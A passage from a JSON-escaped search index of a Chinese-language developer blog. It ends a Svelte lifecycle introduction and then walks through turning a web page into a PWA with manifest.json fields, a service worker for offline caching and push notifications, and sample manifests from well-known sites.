class=\u0026#34;box\u0026#34;\u0026gt; \u0026lt;slot\u0026gt;默认值\u0026lt;/slot\u0026gt; \u0026lt;/div\u0026gt; 生命週期 生命週期是指項目運行時，指定時期會自動執行的方法。\nSvelte 中主要有以下幾個生命週期：\nonMount： 組件掛載時調用。 onDestroy： 組件銷毀時執行。 beforeUpdate： 在數據更新前執行。 afterUpdate： 在數據更新完成後執行。 tick： DOM元素更新完成後執行。 以上生命週期都是需要從 svelte 裡引入的。\n用 onMount 舉個例子\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; import { onMount } from \u0026#39;svelte\u0026#39; let title = \u0026#39;Hello world\u0026#39; onMount(() =\u0026gt; { console.log(\u0026#39;onMount\u0026#39;) setTimeout(() =\u0026gt; title = \u0026#39;雷猴\u0026#39;, 1000) }) \u0026lt;/script\u0026gt; \u0026lt;h1\u0026gt;{title}\u0026lt;/h1\u0026gt; 在組件加載完1秒後，改變 title 的值。\nonDestroy、beforeUpdate 和 afterUpdate 都和 onMount 的用法差不多，只是執行的時間條件不同。\ntick 是比較特殊的，tick 和 Vue 的 nextTick 差不多。\n在 Svelte 中，tick 的使用語法如下：\n1 2 3 4 5 \u0026lt;script\u0026gt; import { tick } from \u0026#39;svelte\u0026#39; await tick() // 其他操作 \u0026lt;/script\u0026gt; 總結 本文主要講解了 Svelte 的基礎用法，但 Svelte 的內容和 API 遠不止此。它還有很多高級的用法以及提供了過渡動畫功能等。\nSvelte 是一個 Web 應用的構建工具，它打包出來的項目體積比較小，性能強，不使用虛擬DOM。\n但 Svelte 的兼容性和周邊生態相比起 Vue 和 React 會差一點。\n所以日常項目中需要根據 Svelte 的優缺點進行取捨。\n","date":"2022-10-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52441500615_771efe89dd_o.png","permalink":"https://wayneblog.ga/2022-10-21/svelte-quick-start/","title":"前端新寵兒？ - Svelte 介紹"},{"content":" 參考網站\n參考網站\n參考網站\n前幾天與大家分享，當開啟Chrome內建的PWA功能，就可將PWA的網頁，一鍵變成一個應用程式，雖然說PWA只是在應用程式裡，包了Chrome的瀏覽器，但開啟時就像應用程式一般，讓網頁就像應用程式一般，其實簡單的來說，這就有點像PhoneGap的感覺，但比PhoneGap要來的簡單許多。\n因此只要將網頁加入一些簡單的宣告與設定，立即就可將一般的網頁變成PWA的網頁應用程式，真心覺得PWA是個好物，因此只要你會寫網頁，就可將你所設計的網頁變成一隻應用程式！\n將網頁變成Progressive Web Application(PWA) Step1：下載 Chrome 擴充套件 點我前往 「Web Server」 擴充套件\n首先，你可先下載Chrome的「Web Server」擴充程式，再點「CHOSOSE FOLDER」鈕，選擇已製作好的網頁目錄。\nStep2：檢查網頁 點一下連結，並檢查網頁是否能正常呈現。\nStep3：建立 manifest.json 更多 manifest.json 介紹，點我前往\n接著建立一個新的文件檔，並依的輸入應用程式名稱、圖示、與應用程式的URL，再將它儲存為「manifest.json」檔。\nmanifest.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 { \u0026#34;short_name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;偉恩的部落格，用於紀錄coding life查找的資料、筆記與文章，統整起來除了自己使用，也希望對各位有幫助。\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-57x57.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;57x57\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-114x114.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;114x114\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-120x120.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;120x120\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-180x180.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;180x180\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-192x192.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-512x512.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./maskable_icon.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34;, \u0026#34;purpose\u0026#34;: \u0026#34;any maskable\u0026#34; } ], \u0026#34;lang\u0026#34;: \u0026#34;zh-Hant-TW\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#f5f5fa\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#57BCB9\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;orientation\u0026#34;: \u0026#34;landscape\u0026#34;, \u0026#34;prefer_related_applications\u0026#34;: false } Step4：html 加入 manifest.json 在head標籤中加入 manifest.json。\n1 2 3 \u0026lt;!-- ... --\u0026gt; \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;./manifest.json\u0026#34; /\u0026gt; \u0026lt;!-- ... --\u0026gt; 由於 manifest 在 IOS 上還不支援，因此如果 IOS 上也想要自訂 icon，就要改用 HTML 裡的 meta 來設定，如下：\n1 2 3 4 5 6 7 8 9 \u0026lt;!-- ... --\u0026gt; \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;./manifest.json\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;57x57\u0026#34; href=\u0026#34;./apple-touch-icon-57x57.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;114x114\u0026#34; href=\u0026#34;./apple-touch-icon-114x114.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;120x120\u0026#34; href=\u0026#34;./apple-touch-icon-120x120.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;180x180\u0026#34; href=\u0026#34;./apple-touch-icon-180x180.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;192x192\u0026#34; href=\u0026#34;./apple-touch-icon-192x192.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;512x512\u0026#34; href=\u0026#34;./apple-touch-icon-512x512.png\u0026#34; /\u0026gt; \u0026lt;!-- ... --\u0026gt; Step5：打開開發人員工具檢查 manifest.json 的設定 Step6：加入 serviceWorker 語法 更多 Service Worker 介紹，點我前往\n在網頁前加入下方的語法。\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; if (\u0026#34;serviceWorker\u0026#34; in navigator) { console.log(\u0026#34;Will service worker register?\u0026#34;); navigator.serviceWorker.register(\u0026#34;./service-worker.js\u0026#34;).then(function(reg) { console.log(\u0026#34;Yes it did.\u0026#34;); }).catch(function(err) { console.log(\u0026#34;No, it didn\u0026#39;t. This happened: \u0026#34;, err); }); } \u0026lt;/script\u0026gt; Step7：建立 service-worker.js 檔案 接著再建立一個文件，並貼上下方的語法，儲存為 service-worker.js，這時可看到在原來的網頁中，分別會多了 manifest.json 與 service-worker.js 和圖片資料夾。\nservice-worker.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 self.addEventListener(\u0026#39;install\u0026#39;, function(event) { self.skipWaiting(); var offlinePage = new Request(\u0026#39;offline.html\u0026#39;); event.waitUntil( fetch(offlinePage).then(function(response) { return caches.open(\u0026#39;offline2\u0026#39;).then(function(cache) { return cache.put(offlinePage, response); }); })); }); self.addEventListener(\u0026#39;fetch\u0026#39;, function(event) { event.respondWith( fetch(event.request).catch(function(error) { return caches.open(\u0026#39;offline2\u0026#39;).then(function(cache) { return cache.match(\u0026#39;offline.html\u0026#39;); }); })); }); self.addEventListener(\u0026#39;refreshOffline\u0026#39;, function(response) { return caches.open(\u0026#39;offline2\u0026#39;).then(function(cache) { return cache.put(offlinePage, response); }); }); self.addEventListener(\u0026#39;push\u0026#39;, function (event) { var data = event.data.json(); var opts = { body: data.body, icon: data.icon, data: { url: data.url } }; event.waitUntil(self.registration.showNotification(data.title, opts)); }); self.addEventListener(\u0026#39;notificationclick\u0026#39;, function(event) { var data = event.notification.data; event.notification.close(); event.waitUntil( clients.openWindow(data.url) ); }); Step8：確認 Service Workers 是否正常 接著再回到網頁的「開發人員工具」的 Service Workers 時，就會看到綠色燈號。\nStep9：安裝「頁面」 都完成後，再點 Chrome 右上的選單圖示，就可看到「安裝XXX」。\nStep10：安裝 點一下，就會出現安裝畫面，再點「安裝」。\n當安裝完畢後，就會開啟剛所安裝的應用程式，哈！是不是畫面乾淨許多，就像在使用一般的應用程式一樣，有了PWA後可實現透過網頁就能打造專屬的應用程式的夢想，且完全不用再學新語言，真是超方便的。\nmanifest.json 介紹 以下來說明一下 manifest.json\nmanifest.json 是在學 PWA 這塊時最簡單的部份，主要是建一支 JSON 檔就可以，相關的參數 MDN上 或是 Google 一下就會看到，不用花太多的時間去記。\nmanifest.json是做什麼用的？ 根據 MDN 上的解釋，manifest.json 是這樣子的：\n它提供了應用程式相關的資訊（像是名稱、作者、圖示、描述）。 manifest 的功用是將 Web 應用程式安裝到設備的主畫面，為使用者提供更快速的訪問和更豐富的體驗。\n簡單的說明就是，PWA 主要就是讓網頁可以模擬成一個手機的 App 來使用，要當成 App，就要有 App 的樣子，就要能在手機的桌面上有一個 icon 可以按，按下去後有一個幾秒鐘的啟動畫面讓使用者知道開啟的 App 是什麼，manifest 就是在處理這段。\n另外，一般我們在手機上開 Chrome 或 Safari 看網頁時，最頂部會有一條網址列，但一般 App 是不會有的，而 manifest.json 也可以設定開啟頁面時不顯示網址列。\nPWA 是把頁面模擬成 App 的一個方法，如果公司本身也有製作 App 呢？manifest.json 上也可以設定 App 在 Google Play、App Store 上的連結，並呈現一個推薦通知讓使用者可以進入並下載。\n最後補充一點，不論是 PWA 的 Cache 或是推播功能，都要求網站要是 https，manifest.json 這點也不意外，如果網站不是 https，即便引用了 manifest.json，也不會被 Chrome 主動詢問是否要將網站加入到主畫面。\n關於 manifest 的功能，Google 有一隻影片介紹：\nWeb App Manifest: Totally Tooling Tips\nmanifest.json 成員 成員列表整理如下：\n欄位 說明 theme_color 應用程式的主要顏色 background_color 啟動畫面（splash screen）的背景色 icons 應用程式的圖示 name 應用程式的名稱 short_name 應用程式的簡寫 lang 主要語言 description 應用程式的描述 dir 文字書寫方向 display 應用程式的顯示模式 orientation 預設顯示的方向是直的或橫的 prefer_related_applications 是否要推薦一個原生的 App related_applications 推薦原生 App 的連結 start_url 開啟應用程式時的預設網址 scope 應用程式的使用範圍 theme_color 應用程式的主要顏色，主要可以改變網址列那一條的顏色。\n1 \u0026#34;theme_color\u0026#34;: \u0026#34;#57BCB9\u0026#34; background_color 啟動畫面（splash screen）的背景色，App 啟動時，會有一個 Splash Screen，翻譯成快閃頁、過場頁，本篇稱為啟動畫面。\nSplash Screen 需要3個成員：background_color、icons、name。\n1 \u0026#34;background_color\u0026#34;: \u0026#34;red\u0026#34; 補充一點，Splash Screen，在 IOS 上是不支援的，但可以直接讀取一張圖檔來當作啟動頁面，在 head 裡加入以下就行：\n1 2 3 4 5 6 7 \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-640x1136.png\u0026#34; media=\u0026#34;(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-750x1294.png\u0026#34; media=\u0026#34;(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1125x2436.png\u0026#34; media=\u0026#34;(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1242x2148.png\u0026#34; media=\u0026#34;(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1536x2048.png\u0026#34; media=\u0026#34;(min-device-width: 768px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1668x2224.png\u0026#34; media=\u0026#34;(min-device-width: 834px) and (max-device-width: 834px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-2048x2732.png\u0026#34; media=\u0026#34;(min-device-width: 1024px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; icons 應用程式的圖示，icons 裡放陣列，放不同尺寸下的主要圖示，如果 Splash Screen 裡要用的圖示，大小必須包含 192px、512px。\nicons 裡，陣列裡的每一個物件有 3 個成員：\nsizes 圖片尺寸，可用在多個尺寸上的話用空白鍵區隔。 src 圖片的路徑，如果是相對路徑，是以 manifest 所在的位置為基準。 type 圖檔類型，這項排必填，主要是告知裝置類型，讓不支援的裝置可以快速略過。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;icon/lowres.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;48x48\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;icon/lowres\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;48x48\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;icon/hd_hi.ico\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;72x72 96x96 128x128 256x256\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;icon/hd_hi.svg\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;72x72\u0026#34; } ] 由於 manifest 在 IOS 上還不支援，因此如果 IOS 上也想要自訂 icon，就要改用 HTML 裡的 meta 來設定，如下：\n1 2 3 \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;57x57\u0026#34; href=\u0026#34;apple-icon-57x57.png\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;72x72\u0026#34; href=\u0026#34;apple-icon-72x72.png\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;114x114\u0026#34; href=\u0026#34;apple-icon-114x114.png\u0026#34; /\u0026gt; name 應用程式的完整名稱，會顯示在 Splash Screen上，以及主畫面上的名稱。\n1 \u0026#34;name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34; short_name 應用程式的簡寫，當 name 太長而無法顯示時，會改成顯示簡寫。\n1 \u0026#34;short_name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34; lang 主要語言，針對 name、short_name 這兩個使用的。\n語言列表可以在這找：https://www.iana.org\n1 \u0026#34;lang\u0026#34;: \u0026#34;zh-Hant-TW\u0026#34; description 應用程式的描述，描述這個應用程式是做什麼的。\n1 \u0026#34;description\u0026#34;: \u0026#34;偉恩的部落格，用於紀錄coding life查找的資料、筆記與文章，統整起來除了自己使用，也希望對各位有幫助。\u0026#34; dir 文字書寫方向，值有 3 個：ltr（左至右）、rtl（右至左）、auto（讓瀏覽器自己決定），不填的話預設值是 auto。\n1 \u0026#34;dir\u0026#34;: \u0026#34;ltr\u0026#34; display 應用程式的顯示模式，顯示模式指的是從主畫面點開 App 後，要顯示的樣子，有 4 個值可用：\nfullscreen： 全螢幕，就像在用原生 App 一樣，會隱藏所有的瀏覽器 UI。 standalone： 會隱藏標準瀏覽器 UI 元素，如 URL 欄等。 browser： 預設值，就像一般用瀏覽器一樣。 minimal： ui 會有導覽列最小的 UI，這個值 Chrome 不支援。 如果要 Chrome 主動提示加入主畫面的話，設定值必須要是 standalone。\n1 \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34; orientation 預設顯示的方向是直的或橫的，可以強制讓使用者必須裝置拿直的（landscape）或拿橫的（portrait）看。這點要設要仔細思考過才行，因為使用都大部份都喜歡自己決定是直看或横看。\n如果是遊戲類型的，可以設定用橫的。\n1 \u0026#34;orientation\u0026#34;: \u0026#34;landscape\u0026#34; prefer_related_applications 是否要推薦一個原生的 App，PWA 是模擬頁面為 App，如果網站本身有出 App，這項就可以設成 true，從主畫面點開頁面時就會出現可以下載 App 的提示。\n如果這項為 true，則下面的 related_applications 就要填入值；這項的預設值為 false。\n1 \u0026#34;prefer_related_applications\u0026#34;: false related_applications 推薦原生 App 的連結，值是陣列，裡面放 App 資訊的物件，每項物件有 2 個成員要填，是 Google Play 上的話則有 3 個成員。\nplatform： 應用程式的平台，可填 play、itunes。 url： 應用程式的網址。 id： Google Play上要填的 ID。 1 2 3 4 5 6 7 8 9 10 11 \u0026#34;related_applications\u0026#34;: [ { \u0026#34;platform\u0026#34;: \u0026#34;play\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://play.google.com/store/apps/details?id=com.example.app1\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;com.example.app1\u0026#34; }, { \u0026#34;platform\u0026#34;: \u0026#34;itunes\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://itunes.apple.com/app/example-app1/id123456789\u0026#34; } ] start_url 開啟應用程式時的預設網址，如果有設定的話，開啟應用程式時就會進到設定的網址。沒設定的話就是使用者按加入主畫面時的那個網址。\n如果填寫的是相對路徑，是以 manifest 所在的位置為基準。\n建議可以在網址上加入 Google Analytics 的 utm 參數，這樣在 GA 上就可以看見多少來源是來自於 PWA，可以檢測成效。\n如果要 Chrome 主動提示加入主畫面的話，這項必須填寫。\n1 \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34; scope 應用程式的使用範圍，這項如果有填，那應用程式的作用域就會限在指定的目錄裡，超過指定目錄，就會當成一般的網頁瀏覽。\n1 \u0026#34;scope\u0026#34;: \u0026#34;/myapp/\u0026#34; manifest.json 基本檔案內容 manifest 裡的成員不是每項都一定要填寫的，以下附上 manifest.json 的基本檔內容：\nmanifest.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 { \u0026#34;short_name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;偉恩的部落格，用於紀錄coding life查找的資料、筆記與文章，統整起來除了自己使用，也希望對各位有幫助。\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-57x57.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;57x57\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-114x114.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;114x114\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-120x120.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;120x120\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-180x180.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;180x180\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-192x192.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-512x512.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./maskable_icon.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34;, \u0026#34;purpose\u0026#34;: \u0026#34;any maskable\u0026#34; } ], \u0026#34;lang\u0026#34;: \u0026#34;zh-Hant-TW\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#f5f5fa\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#57BCB9\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;orientation\u0026#34;: \u0026#34;landscape\u0026#34;, \u0026#34;prefer_related_applications\u0026#34;: false } 關於「Chrome 主動提示加入主畫面」 PWA 身為 Google 的親身兒子，在 Android 手機是很有吃香的點。\n頁面引用了 manifest.json 後，使用者在手機上點選加入主畫面，頁面就可以像 App 一樣顯示在手機的主畫面上。\n但很多使用者其實不知道有這功能，或是知道了也不常會去按。\n貼心的 Google 針對這點做了一項措施，就是主動詢問使用者要不要將頁面加入主畫面。\n根據 Google 的說明文件：Add to Home Screen，觸發 Chrome 主動詢問是否加入主畫面的條件如下：\n使用者還沒加入主畫面 在有 manifes.json 的網域下，互動了至少 30 秒 manifset.json 裡有幾項成員一定要有：name 或 short_name、icons、start_url、display 頁面要是 https 頁面有裝 service-worker（sw.js），裡面有監聽並處理 beforeinstallprompt 事件 第 5 點，是否要有寫 beforeinstallprompt，好像不是必填項目，即便沒填，在測試時也會在底部出現一條詢問框。\n在參考了這篇以後：PWA 實戰經驗分享\n發現別人是用在 UX 上更優化的地方，就是自己選擇要出現詢問框時用的。\nmanifest 觀摩 我們來看看幾個知名的 PWA 都是怎麼寫他們的 manifest.json。\n第一個是 PWA 界中很有名的 flipkart：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 { \u0026#34;name\u0026#34;: \u0026#34;Flipkart Lite\u0026#34;, \u0026#34;short_name\u0026#34;: \u0026#34;Flipkart Lite\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;https:/https://static.coderbridge.com/img/techbridge/images1a.flixcart.com/www/linchpin/batman-returns/logo_lite-cbb3574d.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; } ], \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;656085505957\u0026#34;, \u0026#34;gcm_user_visible_only\u0026#34;: true, \u0026#34;start_url\u0026#34;: \u0026#34;/?start_url=homescreenicon\u0026#34;, \u0026#34;permissions\u0026#34;: [ \u0026#34;gcm\u0026#34; ], \u0026#34;orientation\u0026#34;: \u0026#34;portrait\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#2874f0\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#2874f0\u0026#34; } 再來是鼎鼎大名的 twitter：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 { \u0026#34;background_color\u0026#34;: \u0026#34;#ffffff\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;It\u0026#39;s what\u0026#39;s happening. From breaking news and entertainment, sports and politics, to big events and everyday interests.\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;49625052041\u0026#34;, \u0026#34;gcm_user_visible_only\u0026#34;: true, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; } ], \u0026#34;name\u0026#34;: \u0026#34;Twitter\u0026#34;, \u0026#34;share_target\u0026#34;: { \u0026#34;action\u0026#34;: \u0026#34;compose/tweet\u0026#34;, \u0026#34;params\u0026#34;: { \u0026#34;title\u0026#34;: \u0026#34;title\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;url\u0026#34; } }, \u0026#34;short_name\u0026#34;: \u0026#34;Twitter\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#ffffff\u0026#34;, \u0026#34;scope\u0026#34;: \u0026#34;/\u0026#34; } 最後則是 Google I/O 2018：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 { \u0026#34;name\u0026#34;: \u0026#34;Google I/O 2018\u0026#34;, \u0026#34;short_name\u0026#34;: \u0026#34;I/O 2018\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#6284F3\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#6284F3\u0026#34;, \u0026#34;icons\u0026#34;: [{ \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen57.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;57x57\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen114.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;114x114\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen128.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;128x128\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen144.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;144x144\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen192.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen512.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }], \u0026#34;prefer_related_applications\u0026#34;: false, \u0026#34;related_applications\u0026#34;: [{ \u0026#34;platform\u0026#34;: \u0026#34;play\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;com.google.samples.apps.iosched\u0026#34; }], \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;103953800507\u0026#34; } 我滿喜歡觀察別人家的這些東西，因為你會發現很多你查資料時遺漏或是根本找不到的資訊，而且這些看久了你也會有個概念，知道哪些屬性特別常用，除了 manifest.json 以外，也可以參考 html 裡面的 tag，一樣能學習到很多。\nService Worker 介紹 加入 Service Worker 的目的就只有一個，那就是快取。透過 Service 